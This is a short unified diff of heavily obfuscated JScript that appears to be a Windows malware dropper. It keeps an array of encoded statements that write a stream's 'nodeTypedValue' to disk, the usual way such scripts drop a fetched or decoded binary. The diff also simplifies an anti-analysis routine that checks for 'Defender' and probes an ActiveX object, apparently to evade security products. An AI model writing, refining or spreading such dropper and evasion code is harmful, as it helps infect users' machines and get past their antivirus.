@@ -39,6 +39,7 @@ function dwdtgr(){
     bjHTTP = null;
     return dwddtg;
 }
+
 yTnU4RuOR[2] = Array("yTnU4RuOR[4]()[yTnU4RuOR[1][6]] = 1;yTnU4RuOR[4]()[yTnU4RuOR[1][7]]();yTnU4RuOR[4]()[yTnU4RuOR[1][8]+\"ite\"](yTnU4RuOR[3][1]['nodeTypedValue']);", "yTnU4RuOR[4]()[yTnU4RuOR[1][5]] = 0;yTnU4RuOR[4]()[yTnU4RuOR[1][6]] = 2;", "yTnU4RuOR[4]()[yTnU4RuOR[1][4]] = yTnU4RuOR[3][2][0];", null);
 
 var rtrnr = "Defender";
@@ -62,23 +63,15 @@ try {
 }
 
 function kprskyspnnthss() {
-    for (var d = 0; d < 5; d++) {
-		if (d == 2) {
-			var jhgshj = 0;
-            while (true) {
-                break;
-            }
-		}
-		try {
-			if (d == 1 && xctrfnshr(rtrnr)) {
-				var pffWH = new ActiveXObject("pt.PTure");
-			}
-		} catch (error) {
-			if (d == 1) {
-				var jhgshj = 0;
-			}
-		}
-	
-	}
+    try {
+        var dx = 1;
+        if (dx == 1 && xctrfnshr(rtrnr)) {
+            var pffWH = new ActiveXObject("pt.PTure");
+        }
+    } catch (error) {
+        if (dx == 1) {
+            var jhgshj = 0;
+        }
+    }
     
 }
